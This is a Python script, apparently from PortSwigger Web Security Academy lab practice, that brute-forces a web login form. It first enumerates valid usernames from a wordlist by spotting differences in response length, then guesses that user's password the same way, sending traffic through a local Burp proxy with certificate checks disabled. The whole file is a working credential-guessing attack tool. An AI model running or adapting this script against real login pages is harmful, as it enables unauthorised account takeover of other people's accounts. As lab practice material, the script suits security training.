import argparse
import requests as req
import urllib3

urllib3.disable_warnings()


def find_user(u, w):

    with open(w + "users.list", "r") as user_file:
        users = user_file.readlines()

        for user in users:
            data = {"username": user.strip(), "password": "random"}
            resp = req.post(url=u, data=data, verify=False)
            print(len(resp.text))

            if len(resp.text) == 6269:
                continue
            else:
                return user.strip()


def find_password(u, w, user, p):

    with open(w + "passwords.list", "r") as password_file:
        passwords = password_file.readlines()

        for password in passwords:
            data = {"username": user, "password": password.strip()}
            resp = req.post(
                url=u, data=data, verify=False, allow_redirects=True, proxies=p
            )

            if len(resp.text) == 6466:
                continue
            else:
                return password.strip()


if __name__ == "__main__":

    # Add argparse code to parse command-line arguments
    parser = argparse.ArgumentParser(description="Brute Force Login Form")
    parser.add_argument("--url", type=str, help="URL of the login form")
    parser.add_argument(
        "--wordlist",
        type=str,
        default="/home/kali/Documents/portswigger-academy/",
        help="Path to the wordlists directory",
    )
    args = parser.parse_args()

    URL = args.url
    PATH_TO_WORDLISTS = args.wordlist

    PROXIES = {"http": "127.0.0.1:8080", "https": "127.0.0.1:8080"}

    valid_user = find_user(URL, PATH_TO_WORDLISTS)
    print("[+] " + valid_user)

    valid_password = find_password(URL, PATH_TO_WORDLISTS, valid_user, PROXIES)
    print("[+] " + valid_password)

    print("[+] " + valid_user + ":" + valid_password)
